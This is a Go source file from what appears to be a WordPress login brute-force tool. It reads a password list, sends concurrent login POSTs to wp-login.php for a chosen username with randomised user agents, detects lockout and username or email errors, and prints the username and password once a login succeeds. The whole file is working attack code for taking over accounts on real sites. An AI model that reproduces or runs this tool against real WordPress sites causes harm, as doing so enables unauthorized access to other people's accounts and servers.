package utils

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
)

var (
	Mutex sync.Mutex
	wg    sync.WaitGroup

	checkedPass int = 0
	errors      int = 0
)

func HandleMain(websiteURL string, username string, passlist string, threads int) {
	passList, err := os.Open(passlist)

	if err != nil {
		Usage(err.Error())
	}

	var count uint8 = 1

	semaphore := make(chan struct{}, threads)
	scanner := bufio.NewScanner(passList)
	redirectURL := strings.Replace(websiteURL, "wp-login.php", "wp-admin/", -1)
	totalPass := GetTotalPassNum(passlist)

	for scanner.Scan() {
		wg.Add(1)
		password := scanner.Text()
		reqBody := map[string]string{
			"log":         username,
			"pwd":         password,
			"rememberme":  "forever",
			"wp-submit":   "Log In",
			"redirect_to": redirectURL,
			"testcookie":  "1",
		}

		go checkCredencials(websiteURL, reqBody, &count, &semaphore, totalPass)
	}

	wg.Wait()

	fmt.Println(RedColor, "\n\n Valid pass did not found :(")
	os.Exit(0)
}

func checkCredencials(websiteURL string, reqBody map[string]string, c *uint8, semaphore *chan struct{}, totalPass int) {

	defer wg.Done()
	*semaphore <- struct{}{}
	defer func() { <-*semaphore }()

	Mutex.Lock()
	checkedPass++
	Mutex.Unlock()
	data := url.Values{}

	for key, val := range reqBody {
		data.Set(strings.TrimSpace(key), strings.TrimSpace(val))
	}

	req, _ := http.NewRequest("POST", websiteURL, strings.NewReader(data.Encode()))
	req.Close = true

	randomUserAgent := GetUserAgent()

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", randomUserAgent)
	req.Header.Set("Origin", websiteURL)
	req.Header.Set("Referer", websiteURL)

	cookies1 := &http.Cookie{Name: "wordpress_test_cookie", Value: "WP%20Cookie%20check"}

	req.AddCookie(cookies1)

	client := &http.Client{}
	res, err := client.Do(req)

	if err != nil {
		Mutex.Lock()
		errors++
		Mutex.Unlock()
		return
	}

	defer res.Body.Close()

	result, _ := io.ReadAll(res.Body)
	responseString := string(result)

	// Mutex.Lock()
	// resFile, _ := os.Create("response.html")
	// resFile.WriteString(responseString)
	// Mutex.Unlock()

	if len(responseString) < 100 {
		PrintStats("Error message", "Facing error while bruteforce")
		fmt.Println(ResetColor, "More info to debug:-", ResetColor)
		PrintStats("Message: ", "Looks like cloudflare disturbing...")
		PrintStats("Status Code: ", res.Status)
		os.Exit(0)
	}

	var isBruteBlocked bool = strings.Contains(responseString, "minutes")

	if isBruteBlocked {
		PrintStats("Attack Blocked: ", "looks like Bruteforce attack has been blocked by server")
		os.Exit(0)
	}

	if *c == 1 {
		isUsernameValid := strings.Contains(responseString, "not registered")
		isEmailValid := strings.Contains(responseString, "email address.")

		if isUsernameValid {
			PrintStats("Error: ", "Username is incorrect.. Enter a valid username to bruteforce")
			os.Exit(0)
		}
		if isEmailValid {
			PrintStats("Error occured: ", "Email is incorrect.. Enter a valid email to bruteforce")
			os.Exit(0)
		}

		Mutex.Lock()
		*c = *c + 1
		Mutex.Unlock()
	}

	if len(res.Cookies()) > 1 {
		fmt.Println(GreenColor, "\nValid credencials found: ")
		fmt.Printf("Username: %s\nPassword: %s\n", reqBody["log"], reqBody["pwd"])
		os.Exit(0)
	} else {
		StatusPercentage := (checkedPass * 100) / totalPass

		fmt.Printf("%s\r Checked: %s%d/%d (%d%%) %s| %sErrors: %s%d%s", GreenColor, RedColor, checkedPass, totalPass, StatusPercentage, WhiteColor, GreenColor, RedColor, errors, ResetColor)
	}

}
